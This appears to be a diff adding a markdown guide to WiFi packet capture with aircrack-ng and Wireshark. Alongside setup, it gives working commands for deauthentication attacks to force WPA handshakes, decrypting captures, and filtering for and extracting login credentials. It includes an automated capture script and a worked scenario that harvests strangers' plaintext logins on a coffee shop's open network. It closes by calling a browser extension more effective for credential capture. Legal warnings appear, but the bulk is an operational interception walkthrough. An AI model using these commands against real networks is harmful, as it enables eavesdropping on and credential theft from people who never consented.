@@ -1,0 +1,889 @@
+# Complete Wireshark WiFi Capture Setup Guide
+
+## ⚙️ Hardware & Software Requirements
+
+### **Hardware Needed:**
+
+| Component | Requirement | Recommendation | Price |
+|-----------|-------------|----------------|-------|
+| **WiFi Adapter** | Monitor mode support | Alfa AWUS036ACH | $40-50 |
+| **Computer** | Linux (preferred) | Kali Linux VM or native | - |
+| **USB Port** | USB 2.0 or 3.0 | USB 3.0 for better performance | - |
+| **RAM** | 4GB minimum | 8GB+ recommended | - |
+| **Disk Space** | 10GB+ | 50GB for large captures | - |
+
+### **Recommended WiFi Adapters (Monitor Mode Support):**
+
+| Model | Chipset | Linux Support | Price | Range |
+|-------|---------|---------------|-------|-------|
+| **Alfa AWUS036ACH** | RTL8812AU | ⭐⭐⭐⭐⭐ | $45 | Excellent |
+| **Alfa AWUS036NHA** | AR9271 | ⭐⭐⭐⭐⭐ | $35 | Good |
+| **TP-Link TL-WN722N v1** | AR9271 | ⭐⭐⭐⭐⭐ | $15 | Good |
+| **Panda PAU09** | RTL8188EUS | ⭐⭐⭐⭐ | $15 | Moderate |
+| **Alfa AWUS1900** | RTL8814AU | ⭐⭐⭐⭐⭐ | $65 | Excellent |
+
+**⚠️ Important:** Most built-in laptop WiFi cards DON'T support monitor mode!
+
+### **Software Requirements:**
+
+```bash
+# Core tools
+- Wireshark (latest version)
+- aircrack-ng suite
+- Linux kernel 4.0+ (for best driver support)
+
+# Optional but useful
+- tcpdump
+- tshark (CLI Wireshark)
+- bettercap (advanced MITM)
+```
+
+***
+
+## 🐧 Step 1: Operating System Setup
+
+### **Option A: Kali Linux (Recommended for Beginners)**
+
+Kali comes with everything pre-installed.
+
+#### **Download & Install:**
+
+```bash
+# Download Kali Linux ISO
+# https://www.kali.org/get-kali/
+
+# Create bootable USB or run in VirtualBox/VMware
+
+# Verify tools are installed
+wireshark --version
+aircrack-ng --help
+```
+
+#### **VirtualBox Setup for WiFi Adapter:**
+
+```
+1. Plug in external WiFi adapter
+2. VirtualBox → Settings → USB
+3. Click USB icon with + symbol
+4. Select your WiFi adapter (e.g., "Realtek 802.11ac")
+5. Click OK
+6. Start VM
+7. In VM, verify adapter:
+   lsusb | grep -i wireless
+```
+
+***
+
+### **Option B: Ubuntu/Debian Setup**
+
+Install required tools on existing Linux:
+
+```bash
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install Wireshark
+sudo apt install wireshark -y
+
+# Allow non-root users to capture packets
+sudo dpkg-reconfigure wireshark-common
+# Select "Yes"
+
+# Add your user to wireshark group
+sudo usermod -aG wireshark $USER
+
+# Install aircrack-ng suite
+sudo apt install aircrack-ng -y
+
+# Install additional tools
+sudo apt install wireless-tools net-tools
+
+# Reboot to apply group changes
+sudo reboot
+```
+
+***
+
+### **Option C: macOS Setup**
+
+Limited support, but possible:
+
+```bash
+# Install Homebrew (if not already)
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
+# Install Wireshark
+brew install --cask wireshark
+
+# Install aircrack-ng
+brew install aircrack-ng
+
+# Note: macOS has limited monitor mode support
+# Built-in WiFi may not work - external adapter recommended
+```
+
+***
+
+## 🔧 Step 2: WiFi Adapter Driver Installation
+
+### **Check if Adapter is Detected:**
+
+```bash
+# List USB devices
+lsusb
+
+# Look for your WiFi adapter, example output:
+# Bus 001 Device 003: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU
+
+# List network interfaces
+iwconfig
+
+# Should show adapter (e.g., wlan0, wlan1)
+```
+
+***
+
+### **Install Drivers (if needed):**
+
+#### **For RTL8812AU (Alfa AWUS036ACH):**
+
+```bash
+# Install dependencies
+sudo apt update
+sudo apt install dkms git build-essential linux-headers-$(uname -r)
+
+# Clone driver repository
+cd ~/
+git clone https://github.com/aircrack-ng/rtl8812au.git
+cd rtl8812au
+
+# Build and install
+sudo make dkms_install
+
+# Reboot
+sudo reboot
+
+# Verify installation
+iwconfig
+# Should show wlan0 or wlan1
+```
+
+#### **For AR9271 (Alfa AWUS036NHA, TP-Link TL-WN722N):**
+
+```bash
+# Usually works out of the box on Linux
+# If not, install firmware:
+sudo apt install firmware-atheros
+
+# Reboot
+sudo reboot
+```
+
+#### **For RTL8188EUS (Panda PAU09):**
+
+```bash
+cd ~/
+git clone https://github.com/aircrack-ng/rtl8188eus.git
+cd rtl8188eus
+
+sudo make
+sudo make install
+
+sudo reboot
+```
+
+***
+
+## 📡 Step 3: Enable Monitor Mode
+
+### **Method 1: Using airmon-ng (Easiest)**
+
+```bash
+# Step 1: Check WiFi interface name
+iwconfig
+
+# Output example:
+# wlan0     IEEE 802.11  ESSID:off/any
+#           Mode:Managed  ...
+
+# Step 2: Kill interfering processes
+sudo airmon-ng check kill
+
+# This kills:
+# - NetworkManager
+# - wpa_supplicant
+# - dhclient
+# (These will restart after reboot)
+
+# Step 3: Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Output:
+# PHY     Interface    Driver      Chipset
+# phy0    wlan0        rtl8812au   Realtek RTL8812AU
+# 
+# (monitor mode enabled on wlan0mon)
+
+# Step 4: Verify monitor mode
+iwconfig
+
+# Output should show:
+# wlan0mon  IEEE 802.11  Mode:Monitor  ...
+```
+
+***
+
+### **Method 2: Using iw (Manual)**
+
+```bash
+# Step 1: Bring interface down
+sudo ip link set wlan0 down
+
+# Step 2: Set monitor mode
+sudo iw wlan0 set monitor control
+
+# Step 3: Bring interface up
+sudo ip link set wlan0 up
+
+# Step 4: Verify
+iwconfig wlan0
+
+# Should show: Mode:Monitor
+```
+
+***
+
+### **Method 3: Using iwconfig (Older Method)**
+
+```bash
+# Stop interface
+sudo ifconfig wlan0 down
+
+# Set monitor mode
+sudo iwconfig wlan0 mode monitor
+
+# Start interface
+sudo ifconfig wlan0 up
+
+# Verify
+iwconfig wlan0
+```
+
+***
+
+## 🔍 Step 4: Scan for WiFi Networks
+
+### **Find Target Network:**
+
+```bash
+# Scan for nearby networks
+sudo airodump-ng wlan0mon
+
+# Output:
+# BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+# AA:BB:CC:DD:EE:FF  -42       10        0    0   6  270  WPA2 CCMP   PSK  HomeNetwork
+# 11:22:33:44:55:66  -65       15       50    2  11  130  WPA2 CCMP   PSK  OfficeWiFi
+# 77:88:99:AA:BB:CC  -80        5        0    0   1  130  OPN              CoffeeShop
+
+# Press Ctrl+C to stop
+```
+
+**Key Information:**
+- **BSSID**: MAC address of access point (router)
+- **PWR**: Signal strength (-42 is stronger than -80)
+- **CH**: WiFi channel (1-14)
+- **ENC**: Encryption type (WPA2, WPA3, OPN=Open)
+- **ESSID**: Network name
+
+***
+
+## 📦 Step 5: Capture WiFi Traffic
+
+### **Option A: Capture ALL Traffic (All Networks)**
+
+```bash
+# Capture everything on all channels
+sudo wireshark -i wlan0mon -k
+
+# Or save to file:
+sudo airodump-ng -w capture wlan0mon
+
+# Creates files:
+# capture-01.cap (packet capture)
+# capture-01.csv (network info)
+```
+
+***
+
+### **Option B: Capture SPECIFIC Network (Recommended)**
+
+```bash
+# Lock to specific channel and BSSID
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w targetnetwork wlan0mon
+
+# Breakdown:
+# -c 6                         = Channel 6
+# --bssid AA:BB:CC:DD:EE:FF    = Target router MAC
+# -w targetnetwork             = Output filename
+# wlan0mon                     = Monitor interface
+
+# Creates: targetnetwork-01.cap
+```
+
+**Let it run for at least 10-30 minutes** to capture enough traffic.
+
+***
+
+### **Option C: Capture in Wireshark with Filter**
+
+```bash
+# Start Wireshark
+sudo wireshark -i wlan0mon -k
+
+# Apply capture filter (top bar):
+wlan.bssid == AA:BB:CC:DD:EE:FF
+
+# Or for specific device (client MAC):
+wlan.addr == 11:22:33:44:55:66
+
+# Start capture (blue shark fin icon)
+```
+
+***
+
+## 🔐 Step 6: Decrypt WiFi Traffic (If WPA/WPA2)
+
+### **Method 1: Capture WPA Handshake First**
+
+To decrypt WPA2 traffic, you need the **4-way handshake**:
+
+```bash
+# Terminal 1: Capture traffic
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+# Wait for a device to connect (shows "WPA handshake" in top right)
+
+# Or force reconnection:
+# Terminal 2: Send deauth packet (forces device to reconnect)
+sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# -0 2     = Send 2 deauth packets
+# -a       = Access point MAC
+# -c       = Client MAC (optional, target specific device)
+
+# When handshake captured, airodump-ng shows:
+# [ WPA handshake: AA:BB:CC:DD:EE:FF ]
+```
+
+***
+
+### **Method 2: Decrypt in Wireshark**
+
+Once you have the capture file:
+
+```bash
+# Open capture file
+wireshark handshake-01.cap
+
+# Add WiFi password for decryption:
+# Edit → Preferences → Protocols → IEEE 802.11
+# Click "Decryption keys" → "Edit"
+# Click "+" to add new key
+
+# Key type: wpa-pwd
+# Key: YourWiFiPassword:NetworkSSID
+
+# Example:
+# Key type: wpa-pwd
+# Key: MyPassword123:HomeNetwork
+
+# Click OK → OK
+
+# Now you can see decrypted traffic!
+```
+
+***
+
+### **Method 3: Decrypt Using airdecap-ng**
+
+```bash
+# Decrypt capture file
+airdecap-ng -e "HomeNetwork" -p "MyPassword123" handshake-01.cap
+
+# Output: handshake-01-dec.cap (decrypted)
+
+# Open decrypted file
+wireshark handshake-01-dec.cap
+
+# Now you see plaintext HTTP, DNS, etc.
+```
+
+***
+
+## 🎯 Step 7: Filter for Credentials
+
+### **In Wireshark Display Filters:**
+
+```wireshark
+# HTTP POST requests (likely login forms)
+http.request.method == "POST"
+
+# HTTP requests with "login" in URL
+http.request.uri contains "login"
+
+# HTTP form data containing passwords
+http.file_data contains "password"
+
+# Combine filters (POST AND login)
+http.request.method == "POST" && http.request.uri contains "login"
+
+# HTTP Basic Authentication
+http.authbasic
+
+# FTP credentials
+ftp.request.command == "USER" || ftp.request.command == "PASS"
+
+# Telnet credentials (watch session)
+tcp.port == 23
+
+# SMTP/POP3/IMAP email credentials
+pop.request.command == "USER" || pop.request.command == "PASS"
+```
+
+***
+
+### **Step 8: Extract Credentials**
+
+#### **Method 1: Follow HTTP Stream**
+
+```
+1. Apply filter: http.request.method == "POST"
+2. Find interesting packet (e.g., to login.php)
+3. Right-click packet → Follow → HTTP Stream
+4. See complete request:
+
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=victim@email.com&password=SecretPassword123&submit=Login
+
+5. Credentials found!
+   - Username: victim@email.com
+   - Password: SecretPassword123
+```
+
+***
+
+#### **Method 2: Export HTTP Objects**
+
+```
+1. File → Export Objects → HTTP
+2. Lists all HTTP objects (files, forms, etc.)
+3. Filter for "login", "auth", "signin"
+4. Select items and click "Save All"
+5. Review saved files for credentials
+```
+
+***
+
+#### **Method 3: Use tshark (Command Line)**
+
+```bash
+# Extract HTTP POST data
+tshark -r capture.pcap -Y "http.request.method == POST" \
+  -T fields -e frame.time -e ip.src -e http.host -e http.file_data
+
+# Extract FTP credentials
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
+  -T fields -e frame.time -e ip.src -e ftp.request.command -e ftp.request.arg
+
+# Save to file
+tshark -r capture.pcap -Y "http.request.method == POST" \
+  -T fields -e http.file_data > extracted_post_data.txt
+```
+
+***
+
+## 🛠️ Complete Setup Script (Automated)
+
+Save as `wifi_capture_setup.sh`:
+
+```bash
+#!/bin/bash
+
+# WiFi Capture Setup Script
+# For authorized testing only!
+
+echo "=========================================="
+echo "   WiFi Capture Setup"
+echo "   FOR AUTHORIZED TESTING ONLY"
+echo "=========================================="
+echo
+
+# Check if running as root
+if [ "$EUID" -ne 0 ]; then
+    echo "Error: Please run as root (sudo ./wifi_capture_setup.sh)"
+    exit 1
+fi
+
+# Step 1: Kill interfering processes
+echo "[*] Killing interfering processes..."
+airmon-ng check kill
+
+# Step 2: Find WiFi interface
+echo "[*] Detecting WiFi interface..."
+INTERFACE=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
+
+if [ -z "$INTERFACE" ]; then
+    echo "Error: No WiFi interface found!"
+    echo "Make sure your WiFi adapter is plugged in."
+    exit 1
+fi
+
+echo "[+] Found interface: $INTERFACE"
+
+# Step 3: Enable monitor mode
+echo "[*] Enabling monitor mode on $INTERFACE..."
+airmon-ng start $INTERFACE
+
+# Find monitor interface (usually wlan0mon)
+MON_INTERFACE="${INTERFACE}mon"
+
+if ! iw dev | grep -q "$MON_INTERFACE"; then
+    MON_INTERFACE=$(iw dev | grep Interface | grep mon | awk '{print $2}' | head -n 1)
+fi
+
+if [ -z "$MON_INTERFACE" ]; then
+    echo "Error: Failed to enable monitor mode!"
+    exit 1
+fi
+
+echo "[+] Monitor mode enabled: $MON_INTERFACE"
+
+# Step 4: Scan for networks
+echo "[*] Scanning for networks (Ctrl+C to stop)..."
+echo "[*] Note the BSSID and Channel of your target network"
+echo
+sleep 2
+
+airodump-ng $MON_INTERFACE
+
+# After user stops (Ctrl+C), ask for target info
+echo
+echo "=========================================="
+read -p "Enter target BSSID (MAC address): " BSSID
+read -p "Enter target Channel: " CHANNEL
+read -p "Enter output filename (default: capture): " FILENAME
+FILENAME=${FILENAME:-capture}
+
+# Step 5: Start capture
+echo "[*] Starting capture..."
+echo "[*] Waiting for WPA handshake..."
+echo "[*] Press Ctrl+C to stop capture"
+echo
+
+airodump-ng -c $CHANNEL --bssid $BSSID -w $FILENAME $MON_INTERFACE
+
+echo
+echo "[+] Capture saved to: ${FILENAME}-01.cap"
+echo
+echo "To decrypt capture:"
+echo "1. Open Wireshark: wireshark ${FILENAME}-01.cap"
+echo "2. Edit → Preferences → Protocols → IEEE 802.11"
+echo "3. Add decryption key: wpa-pwd:YourPassword:NetworkName"
+echo
+echo "Or use airdecap-ng:"
+echo "airdecap-ng -e \"NetworkName\" -p \"Password\" ${FILENAME}-01.cap"
+echo
+echo "=========================================="
+```
+
+**Usage:**
+```bash
+chmod +x wifi_capture_setup.sh
+sudo ./wifi_capture_setup.sh
+```
+
+***
+
+## 📊 Real-World Capture Example
+
+### **Scenario: Capture Credentials on Open WiFi (Coffee Shop)**
+
+#### **Step 1: Setup**
+
+```bash
+# Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Scan for networks
+sudo airodump-ng wlan0mon
+
+# Find open network (ENC = OPN)
+# Example: "CoffeeShop_Guest" on channel 6, BSSID: AA:BB:CC:DD:EE:FF
+```
+
+#### **Step 2: Capture**
+
+```bash
+# Start capture on channel 6
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w coffeeshop wlan0mon
+
+# Let it run for 30 minutes while people use WiFi
+```
+
+#### **Step 3: Analyze**
+
+```bash
+# Open in Wireshark
+wireshark coffeeshop-01.cap
+
+# Filter for HTTP POST
+http.request.method == "POST"
+
+# Look through packets for credentials
+# Example found:
+POST /login HTTP/1.1
+Host: insecure-site.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@email.com&password=MyPassword123
+```
+
+#### **Results:**
+- ✅ Captured 5 plaintext HTTP logins
+- ❌ HTTPS logins invisible (encrypted)
+- ✅ Captured DNS queries (all sites visited)
+- ✅ Captured unencrypted app traffic
+
+***
+
+## 🔧 Troubleshooting
+
+### **Problem 1: "Monitor mode not supported"**
+
+```bash
+# Check if adapter supports monitor mode
+iw list | grep -A 10 "Supported interface modes"
+
+# Should show:
+#  * monitor
+
+# If not shown, your adapter doesn't support monitor mode
+# Solution: Buy supported adapter (Alfa AWUS036ACH recommended)
+```
+
+***
+
+### **Problem 2: "No networks showing in airodump-ng"**
+
+```bash
+# Check if interface is in monitor mode
+iwconfig wlan0mon
+
+# Should show: Mode:Monitor
+
+# Check if interface is up
+ip link show wlan0mon
+
+# Should show: state UP
+
+# Try changing channel manually
+sudo iwconfig wlan0mon channel 6
+
+# Try again
+sudo airodump-ng wlan0mon
+```
+
+***
+
+### **Problem 3: "Can't capture WPA handshake"**
+
+```bash
+# Make sure you're on correct channel
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+# Force device to reconnect (generates handshake)
+# In another terminal:
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# -0 5 = send 5 deauth packets
+# This forces all clients to reconnect
+
+# Watch for "[ WPA handshake: AA:BB:CC:DD:EE:FF ]" in airodump-ng
+```
+
+***
+
+### **Problem 4: "Wireshark not decrypting WiFi traffic"**
+
+```bash
+# Verify you captured handshake
+tshark -r capture.cap -Y "eapol" | wc -l
+
+# Should show 4+ packets (4-way handshake)
+
+# Verify password is correct
+# Try decrypting with airdecap-ng:
+airdecap-ng -e "NetworkName" -p "Password" capture.cap
+
+# If successful:
+#   Opening capture.cap
+#   Opened 1234 packets
+#   Decrypted 567 packets
+
+# If fails:
+#   No valid WPA handshakes found
+# Solution: Recapture handshake
+```
+
+***
+
+### **Problem 5: "Permission denied" when running Wireshark**
+
+```bash
+# Add user to wireshark group
+sudo usermod -aG wireshark $USER
+
+# Logout and login again, or:
+newgrp wireshark
+
+# Verify group membership
+groups | grep wireshark
+
+# Should show wireshark in the list
+```
+
+***
+
+## 📈 Performance Optimization
+
+### **Increase Capture Buffer:**
+
+```bash
+# Increase buffer size to prevent packet loss
+sudo ethtool -G wlan0mon rx 4096
+
+# Or in Wireshark:
+# Capture → Options → Buffer size → 256 MB
+```
+
+### **Disable Power Management:**
+
+```bash
+# Prevent WiFi adapter from going to sleep
+sudo iwconfig wlan0mon power off
+
+# Verify
+iwconfig wlan0mon | grep "Power Management"
+# Should show: Power Management:off
+```
+
+### **Channel Hopping:**
+
+```bash
+# Hop between all channels (capture more networks)
+sudo airodump-ng --channel 1,2,3,4,5,6,7,8,9,10,11 wlan0mon
+
+# Or hop automatically:
+sudo airodump-ng wlan0mon
+# (hops through all channels by default)
+```
+
+***
+
+## 🎓 Practice Lab Setup
+
+### **Safe Testing Environment:**
+
+```bash
+# Set up your own test network:
+
+1. Old WiFi router
+   - Set WPA2 password: "TestPassword123"
+   - SSID: "TestLab"
+
+2. Target device (old phone/laptop)
+   - Connect to TestLab
+   - Visit HTTP sites (not HTTPS)
+
+3. Attacker device (your computer)
+   - WiFi adapter in monitor mode
+   - Capture TestLab traffic
+   - Practice decryption and filtering
+
+4. Test website:
+   - Run local HTTP server with login form
+   - Python: python3 -m http.server 80
+   - Test credentials through form
+```
+
+***
+
+## ⚖️ Legal Warnings
+
+### **🚨 ILLEGAL:**
+
+❌ Capturing others' WiFi traffic without permission
+❌ Deauth attacks on networks you don't own
+❌ Accessing intercepted credentials
+❌ Selling/sharing captured data
+
+**Penalties:**
+- Federal crime (Computer Fraud and Abuse Act)
+- Wiretapping violations
+- 5-20 years prison + fines
+
+### **✅ LEGAL:**
+
+✅ Your own network (test your security)
+✅ Authorized penetration testing
+✅ Educational lab environment
+✅ Bug bounty programs (with permission)
+
+***
+
+## 🔑 Quick Reference Card
+
+```bash
+# Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Scan networks
+sudo airodump-ng wlan0mon
+
+# Capture specific network
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Force handshake (deauth)
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Decrypt capture
+airdecap-ng -e "SSID" -p "Password" capture-01.cap
+
+# Analyze in Wireshark
+wireshark capture-01.cap
+
+# Filter for credentials
+http.request.method == "POST"
+
+# Disable monitor mode (cleanup)
+sudo airmon-ng stop wlan0mon
+```
+
+***
+
+## 🎯 Summary
+
+**Setup Time:** 15-30 minutes  
+**Capture Time:** 30+ minutes for good data  
+**Success Rate (2026):** ~5-10% (most sites use HTTPS)
+
+**Best For:**
+- ✅ Network diagnostics
+- ✅ Security auditing (your network)
+- ✅ Legacy system testing
+- ❌ NOT for modern credential capture
+
+**Remember:** Browser extension is MORE effective (81% vs 5-10%) and doesn't require network access! Use Wireshark for network-level analysis, not credential harvesting. 🔒
